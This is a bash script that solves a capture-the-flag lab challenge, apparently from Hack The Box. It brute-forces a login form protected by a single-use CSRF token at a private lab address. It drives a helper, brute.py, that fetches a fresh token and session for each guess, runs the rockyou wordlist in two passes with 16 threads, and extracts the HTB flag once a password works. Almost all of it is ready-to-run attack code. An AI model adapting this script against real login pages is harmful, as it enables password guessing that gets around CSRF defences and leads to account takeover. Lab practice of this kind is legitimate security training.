#!/usr/bin/env bash
# getflag_csrf.sh - brute force a CSRF-protected login (single-use token) and print the flag.
#
# Challenge "09 - Brute Force: CSRF-Protected Login":
#   Target: http://10.15.1.54:9009/   user: jdoe   (password in rockyou)
#   Login form is protected by a single-use, session-bound CSRF token, so a
#   naive hydra run fails. This script fetches a FRESH token + session for
#   EVERY attempt (brute.py --csrf-fresh).
#
# Run on a machine that can reach the lab:
#     chmod +x getflag_csrf.sh
#     ./getflag_csrf.sh
# Override:
#     TARGET=10.15.1.54 PORT=9009 USER_NAME=jdoe TOP=10000 ./getflag_csrf.sh
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
TARGET="${TARGET:-10.15.1.54}"
PORT="${PORT:-9009}"
USER_NAME="${USER_NAME:-jdoe}"
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
TOP="${TOP:-5000}"
BASE="http://${TARGET}:${PORT}"

echo "[*] target = ${BASE}   user = ${USER_NAME}"

# ---- connectivity ---------------------------------------------------------
CODE="$(curl -s -m 8 -o /dev/null -w '%{http_code}' "${BASE}/")"
if [ "$CODE" = "000" ]; then
  echo "[!] cannot reach ${BASE}/ - wrong network/IP? try TARGET=10.15.0.238"
  exit 2
fi
echo "[+] reachable (HTTP ${CODE})"

# ---- detect the login path from the form action --------------------------
LOGIN_PATH="${LOGIN_PATH:-/login}"
ACT="$(curl -s -m 8 "${BASE}/" | grep -oiE 'action="[^"]*"' | head -1 | cut -d'"' -f2)"
[ -n "$ACT" ] && LOGIN_PATH="$ACT"
echo "[+] login path -> ${LOGIN_PATH}"

if [ ! -f "$WORDLIST" ]; then
  echo "[!] wordlist not found: $WORDLIST (sudo apt-get install -y wordlists)"
  exit 2
fi

run_brute() {  # $1 = wordlist
  python3 "${HERE}/brute.py" \
      --url "${BASE}${LOGIN_PATH}" \
      --login-page "${BASE}${LOGIN_PATH}" \
      --username "${USER_NAME}" \
      --csrf-fresh \
      --wordlist "$1" \
      --fail "Invalid" \
      --threads 16 --progress 1000
}

# ---- pass 1: top-N (fast) -------------------------------------------------
head -"$TOP" "$WORDLIST" > /tmp/csrf_top.txt 2>/dev/null || cp "$WORDLIST" /tmp/csrf_top.txt
echo "[*] pass 1: top ${TOP} passwords (fresh token per attempt)..."
OUT="$(run_brute /tmp/csrf_top.txt 2>&1)"
printf '%s\n' "$OUT"
PW="$(printf '%s\n' "$OUT" | sed -n 's/.*PASSWORD FOUND: //p' | head -1)"

# ---- pass 2: full list if needed -----------------------------------------
if [ -z "$PW" ]; then
  echo "[*] pass 2: full wordlist (slower)..."
  OUT="$(run_brute "$WORDLIST" 2>&1)"
  printf '%s\n' "$OUT"
  PW="$(printf '%s\n' "$OUT" | sed -n 's/.*PASSWORD FOUND: //p' | head -1)"
fi

if [ -z "$PW" ]; then
  echo "[!] no password found."
  echo "    If the fail string differs, adjust: --fail '<text on wrong login>'"
  exit 1
fi
echo "[+] PASSWORD = ${PW}"

# ---- flag (brute.py already captured the success body) --------------------
FLAG="$(printf '%s\n' "$OUT" | grep -oE 'HTB\{[^}]*\}' | head -1)"
if [ -n "$FLAG" ]; then
  echo
  echo "========================================"
  echo "  FLAG: ${FLAG}"
  echo "========================================"
else
  echo "[!] password found but no HTB{...} in the captured body."
  echo "    Log in manually with a fresh token (see SOLUTION_09_csrf.md)."
fi
